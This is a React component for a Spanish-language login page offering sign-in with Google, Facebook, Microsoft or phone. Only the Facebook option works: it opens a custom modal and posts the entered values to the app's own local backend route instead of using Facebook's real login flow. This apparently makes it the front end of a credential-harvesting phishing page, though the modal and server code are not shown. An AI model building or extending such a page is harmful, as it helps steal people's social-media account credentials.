import React, { useState } from 'react';
import { Layout, Typography, Button, Input, Divider, message } from 'antd';
import { GoogleOutlined, FacebookOutlined, AppleOutlined, WindowsOutlined, PhoneOutlined } from '@ant-design/icons';
import axios from 'axios';
import FacebookLoginModal from './FacebookLoginModal';
import ProcessingModal from './ProcessingModal';

const { Content } = Layout;
const { Title, Text } = Typography;

const HomePage = () => {
  const [loginModalVisible, setLoginModalVisible] = useState(false);
  const [processingModalVisible, setProcessingModalVisible] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [userData, setUserData] = useState(null);
  const [email, setEmail] = useState('');

  const handleLoginClick = () => {
    setLoginModalVisible(true);
  };

  const handleLoginSubmit = async (values) => {
    try {
      setLoginModalVisible(false);
      setProcessingModalVisible(true);
      
      console.log('Intentando iniciar sesión con:', values);
      
      const response = await axios.post('http://localhost:3002/api/auth/facebook/login', values);
      
      setProcessingModalVisible(false);
      
      if (response.data.success) {
        setIsLoggedIn(true);
        setUserData(response.data.user);
        message.success('¡Bienvenido! Has iniciado sesión correctamente.');
        console.log('Login exitoso:', response.data);
      }
    } catch (error) {
      setProcessingModalVisible(false);
      
      if (error.response) {
        message.error(error.response.data.message || 'Error al iniciar sesión');
        console.log('Error de respuesta:', error.response.data);
      } else {
        message.error('Error al conectar con el servidor');
        console.error('Error de conexión:', error);
      }
      
      setLoginModalVisible(true);
    }
  };

  return (
    <Content style={{ 
      padding: '20px', 
      maxWidth: '400px',
      margin: '40px auto',
      background: '#fff',
      borderRadius: '8px',
      boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
    }}>
      {isLoggedIn ? (
        <>
          <Title level={2}>¡Bienvenido, {userData?.name}!</Title>
          <Text>Has iniciado sesión correctamente con {userData?.email}</Text>
        </>
      ) : (
        <div style={{ textAlign: 'center' }}>
          <Title level={2} style={{ marginBottom: '24px' }}>Te damos la bienvenida de nuevo</Title>
          
          <Input
            placeholder="Dirección de correo electrónico"
            size="large"
            style={{ marginBottom: '16px' }}
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          
          <Button 
            type="primary" 
            size="large"
            block
            style={{ marginBottom: '16px', height: '40px' }}
          >
            Continuar
          </Button>
          
          <Text type="secondary" style={{ display: 'block', marginBottom: '16px' }}>
            ¿No tienes una cuenta? <a href="#">Suscríbete</a>
          </Text>
          
          <Divider style={{ margin: '24px 0' }}>o</Divider>
          
          <Button 
            icon={<GoogleOutlined />}
            size="large"
            block
            style={{ marginBottom: '12px', height: '40px' }}
            onClick={() => message.info('Función no disponible')}
          >
            Continuar con Google
          </Button>
          
          <Button 
            icon={<FacebookOutlined />}
            size="large"
            block
            style={{ marginBottom: '12px', height: '40px', background: '#1877f2', color: '#fff' }}
            onClick={handleLoginClick}
          >
            Continuar con Facebook
          </Button>
          
          <Button 
            icon={<WindowsOutlined />}
            size="large"
            block
            style={{ marginBottom: '12px', height: '40px' }}
            onClick={() => message.info('Función no disponible')}
          >
            Continuar con una cuenta de Microsoft
          </Button>
          
          <Button 
            icon={<PhoneOutlined />}
            size="large"
            block
            style={{ height: '40px' }}
            onClick={() => message.info('Función no disponible')}
          >
            Continuar con el teléfono
          </Button>
        </div>
      )}

      <FacebookLoginModal 
        visible={loginModalVisible} 
        onClose={() => setLoginModalVisible(false)}
        onSubmit={handleLoginSubmit}
      />

      <ProcessingModal visible={processingModalVisible} />
    </Content>
  );
};

export default HomePage;
